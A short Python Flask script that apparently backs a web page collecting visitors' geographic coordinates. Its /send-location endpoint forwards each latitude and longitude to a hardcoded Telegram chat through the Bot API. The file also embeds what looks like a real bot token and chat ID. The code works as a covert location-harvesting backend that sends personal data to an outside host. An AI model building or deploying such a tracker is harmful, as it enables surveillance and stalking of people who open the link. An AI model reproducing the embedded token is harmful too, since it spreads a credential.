from flask import Flask, request, render_template
import requests

app = Flask(__name__)

TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"
CHAT_ID = "7485197107"  # غيره إذا تريد

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/send-location", methods=["POST"])
def send_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
        requests.post(url, data={"chat_id": CHAT_ID, "latitude": lat, "longitude": lon})
    return "ok"

if __name__ == "__main__":
    app.run()
